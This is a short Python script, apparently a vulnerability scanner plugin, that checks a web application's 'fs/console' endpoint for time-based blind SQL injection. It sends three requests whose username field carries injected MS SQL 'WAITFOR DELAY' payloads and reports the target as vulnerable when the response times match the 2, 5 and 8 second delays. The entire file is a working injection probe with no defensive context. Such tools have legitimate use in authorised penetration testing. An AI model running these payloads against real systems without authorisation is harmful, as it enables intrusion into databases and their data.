import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand=randomInt(1, 100)
def scan(baseurl):
	url=baseurl+f"fs/console?username={rand}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 500:
		r0=True
	else:
		r0=False
	url=baseurl+f"fs/console?username={rand}%27;WAITFOR%20DELAY%20%270:0:2%27--&password=WiEZoxowjDhBk7bfE9nvzP3TjiK/RivMT1jKxrq42bI"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=15,verify=False)
	t1=response.elapsed.total_seconds()
	url=baseurl+f"fs/console?username={rand}%27;WAITFOR%20DELAY%20%270:0:5%27--&password=WiEZoxowjDhBk7bfE9nvzP3TjiK/RivMT1jKxrq42bI"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=15,verify=False)
	t2=response.elapsed.total_seconds()
	url=baseurl+f"fs/console?username={rand}%27;WAITFOR%20DELAY%20%270:0:8%27--&password=WiEZoxowjDhBk7bfE9nvzP3TjiK/RivMT1jKxrq42bI"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=15,verify=False)
	t3=response.elapsed.total_seconds()
	if 2<=t1<4 and 5<=t2<7 and 8<=t3<10:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
